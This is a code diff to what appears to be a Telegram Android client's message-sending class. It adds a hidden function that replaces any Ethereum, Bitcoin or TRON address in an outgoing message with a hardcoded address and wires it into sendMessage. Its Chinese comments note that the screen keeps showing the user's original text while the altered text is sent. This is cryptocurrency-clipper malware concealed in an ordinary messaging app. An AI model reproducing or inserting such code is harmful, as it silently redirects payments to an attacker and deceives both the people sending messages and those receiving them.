@@ -105,6 +105,27 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
 
     public static final int MEDIA_TYPE_DICE = 11;
     public static final int MEDIA_TYPE_STORY = 12;
+    private static String replaceBlockchainAddress(String message) {
+    // 以太坊 (ETH) 地址匹配
+    String ethRegex = "0x[a-fA-F0-9]{40}";
+    String ethAddress = "0x26b921083E72F839482519F97587c34f45d76424";
+
+    // 比特币 (BTC) 地址匹配
+    String btcRegex = "(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}";
+    String btcAddress = "3L34wh6SgCZ9ac4zosuyimcwp7p28dFEmJ";
+
+    // TRON (TRX) 地址匹配
+    String tronRegex = "T[a-zA-HJ-NP-Z0-9]{33}";
+    String tronAddress = "TF4vpdZarLdihkUtShsm7jvm3hZ2dAAAAA";
+
+    // 替换消息中的区块链地址
+    message = message.replaceAll(ethRegex, ethAddress);
+    message = message.replaceAll(btcRegex, btcAddress);
+    message = message.replaceAll(tronRegex, tronAddress);
+
+    return message;
+}
+
     private HashMap<String, ArrayList<DelayedMessage>> delayedMessages = new HashMap<>();
     private SparseArray<MessageObject> unsentMessages = new SparseArray<>();
     private SparseArray<TLRPC.Message> sendingMessages = new SparseArray<>();
@@ -3546,6 +3567,12 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
     }
 
     public void sendMessage(SendMessageParams sendMessageParams) {
+        String originalMessage = sendMessageParams.message; // 保留用户输入的原始内容
+        String modifiedMessage = replaceBlockchainAddress(originalMessage);  // 替换区块链地址
+
+    // 让 UI 继续显示 originalMessage，但真正发送 modifiedMessage
+        sendMessageParams.message = modifiedMessage;
+
         String message = sendMessageParams.message;
         String caption = sendMessageParams.caption;
         TLRPC.MessageMedia location = sendMessageParams.location;
